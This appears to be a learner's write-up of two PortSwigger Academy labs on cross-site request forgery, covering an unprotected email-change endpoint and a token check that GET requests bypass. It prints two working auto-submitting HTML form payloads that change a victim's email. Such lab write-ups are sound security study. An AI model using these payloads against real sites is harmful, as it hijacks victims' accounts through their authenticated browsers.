# PortSwigger Web Security Academy — CSRF Labs

## Overview

These two labs demonstrate how Cross-Site Request Forgery (CSRF) protections can fail when an application handles the same sensitive action differently depending on the HTTP request method.

The main lesson from both labs was:

> A CSRF defense is only effective if it protects **every way the sensitive action can be performed**.

---

# Lab 1 — CSRF Vulnerability with No Defenses

**Difficulty:** Apprentice
**Vulnerability:** Cross-Site Request Forgery (CSRF)

## Objective

Change the victim's email address by hosting an HTML page on the exploit server.

## Investigation

The first important step was finding the request responsible for changing the email address:

```http
POST /my-account/change-email
```

The request contained an `email` parameter.

Changing the email through Burp confirmed that this endpoint performed a state-changing action.

Because the lab had **no CSRF defenses**, the request could be reproduced from an external webpage.

## CSRF Concept

The attack works because the victim's browser is already authenticated to the target application.

The attacker's page causes the victim's browser to send a request such as:

```text
Victim visits attacker-controlled page
        ↓
Browser sends request to target
        ↓
Victim's session is included
        ↓
Target changes the email
```

The important point is that the attacker does not need to know the victim's password or session token.

## Exploit

A form can automatically submit the request:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email"
      method="POST">

    <input type="hidden" name="email" value="attacker@example.com">

</form>

<script>
    document.forms[0].submit();
</script>
```

The exploit is hosted on the PortSwigger exploit server and delivered to the victim.

## What I Learned

* How to identify a state-changing request.
* How CSRF abuses an already-authenticated browser session.
* How HTML forms can automatically submit requests.
* Why a server-side CSRF defense is necessary even when the request itself looks normal.
* The difference between attacking the server directly and causing a victim's browser to make the request.

---

# Lab 2 — CSRF Where Token Validation Depends on Request Method

**Difficulty:** Practitioner
**Vulnerability:** CSRF caused by inconsistent request-method validation

## Objective

Use the exploit server to change the victim's email address.

## Initial Request

The normal email-change request was:

```http
POST /my-account/change-email
```

with parameters similar to:

```text
email=wiener@example.com
csrf=TOKEN
```

## Step 1 — Test the CSRF Token

Changing the CSRF token caused the request to be rejected.

This showed that the POST implementation was actually validating the token.

```text
POST + valid CSRF
        ↓
Accepted

POST + invalid/missing CSRF
        ↓
Rejected
```

## Step 2 — Change the Request Method

Using Burp's **Change request method** feature, the POST request was converted to GET.

This was the critical discovery.

The GET request used the query string:

```http
GET /my-account/change-email?email=test@example.com
```

The application accepted the request even without a valid CSRF token.

```text
GET + email
        ↓
CSRF token not validated
        ↓
Email changes
```

Therefore, the same sensitive operation had two different security behaviors:

```text
POST → CSRF protection ✅
GET  → CSRF protection ❌
```

## Important Parameter Discovery

During testing, the GET request initially complained that the `email` parameter was missing.

The parameter had been supplied in the POST body, but the GET implementation expected it in the URL query string.

For example:

```http
POST
```

uses:

```text
email=test@example.com
```

in the request body.

While:

```http
GET
```

uses:

```text
?email=test@example.com
```

in the URL.

This was an important lesson:

> When a server says a parameter is missing, check not only **whether** you sent it, but also **where the application expects it**.

## Exploit

Because GET did not require a CSRF token, the vulnerable request could be generated using an HTML form:

```html
<form action="https://YOUR-LAB-ID.web-security-academy.net/my-account/change-email">
    <input type="hidden" name="email" value="anything@web-security-academy.net">
</form>

<script>
    document.forms[0].submit();
</script>
```

The form defaults to GET.

The browser therefore generates:

```http
GET /my-account/change-email?email=anything@web-security-academy.net
```

No CSRF token is required by the vulnerable GET implementation.

## Exploit Delivery

The HTML was uploaded to the PortSwigger exploit server.

Testing the exploit against my own authenticated account confirmed that the email could be changed.

However, changing my own email was only a proof that the exploit worked.

For the lab to register as solved, the final exploit needed to:

1. Use an email different from my own.
2. Be stored on the exploit server.
3. Be delivered to the lab victim.

After the victim executed the exploit, the lab was solved.

---

# Key Technical Lesson

The second lab demonstrates a common security mistake:

```text
Sensitive action
       │
       ├── POST → CSRF validation
       │
       └── GET  → no CSRF validation
```

The developer protected the operation instead of protecting **the operation itself**.

A secure application should not allow an alternative HTTP method to bypass the security control.

---

# Burp Investigation Workflow

The labs also reinforced a useful Burp workflow:

```text
1. Find the interesting request
        ↓
2. Send it to Repeater
        ↓
3. Change one thing at a time
        ↓
4. Observe the response
        ↓
5. Form a hypothesis
        ↓
6. Test the hypothesis
        ↓
7. Build the smallest working PoC
        ↓
8. Verify impact
```

One particularly useful example was:

```text
"Missing parameter: email"
```

Instead of assuming the parameter was completely absent, investigate:

```text
Is it in the body?
Is it in the query string?
Is it a path parameter?
Does the HTTP method change where the server looks for it?
```

---

# Concepts Learned

* CSRF
* CSRF tokens
* HTTP GET vs POST
* Query parameters
* Request bodies
* State-changing requests
* Browser-based CSRF attacks
* Burp Repeater
* Burp Change request method
* Exploit server
* Automatic HTML form submission
* Method-dependent security controls
* Parameter-location debugging
* Proof-of-concept validation

---

# Final Takeaway

The biggest lesson from these labs was not memorizing an HTML payload.

It was learning to ask:

> **"What exactly does the server validate, and does that validation remain in place when I change how I reach the same functionality?"**

A vulnerable application may appear protected until the same action is accessed through another request method or another parameter location.

That is why controlled request modification in Burp is so useful: instead of guessing, change one variable, observe the server's behavior, and build the explanation from the evidence.
